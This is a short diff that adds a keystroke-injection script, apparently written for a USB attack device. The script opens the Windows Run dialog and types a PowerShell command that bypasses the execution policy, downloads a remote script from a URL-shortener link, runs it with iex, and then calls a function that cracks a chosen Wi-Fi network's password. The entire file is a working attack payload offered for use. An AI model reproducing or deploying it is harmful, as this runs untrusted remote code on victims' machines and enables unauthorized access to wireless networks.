@@ -1,0 +1,6 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -NoP -Ep Bypass irm t.ly/Smzcb|iex;Crack-ssid -ssid "SSID YOU WANT TO CRACK"
+DELAY 300
+ENTER
